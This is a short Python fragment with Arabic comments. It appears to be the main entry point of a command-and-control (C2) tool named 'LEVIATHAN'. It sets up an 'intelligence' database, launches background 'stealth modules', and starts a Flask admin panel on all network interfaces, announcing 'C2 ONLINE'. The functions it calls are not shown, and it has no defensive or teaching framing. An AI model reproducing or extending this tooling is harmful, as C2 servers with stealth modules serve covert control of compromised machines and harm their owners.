if __name__ == '__main__':
    # أ. تشغيل قاعدة البيانات (Intel DB)
    setup_intelligence_db() 

    # ب. تشغيل الوحدات الثلاث في الخلفية
    print("[!] INITIALIZING LEVIATHAN HYBRID MODULES...")
    try:
        launch_stealth_modules()
    except Exception as e:
        print(f"[-] Module Deployment Error: {e}")

    # ج. تشغيل السيرفر الرئيسي (Flask)
    print(f"[*] LEVIATHAN C2 ONLINE - ADMIN PANEL READY")
    # ملاحظة: debug=False مهم جداً لكي لا يشتغل الكود مرتين ويسبب أخطاء
    app.run(host='0.0.0.0', port=8080, debug=False)
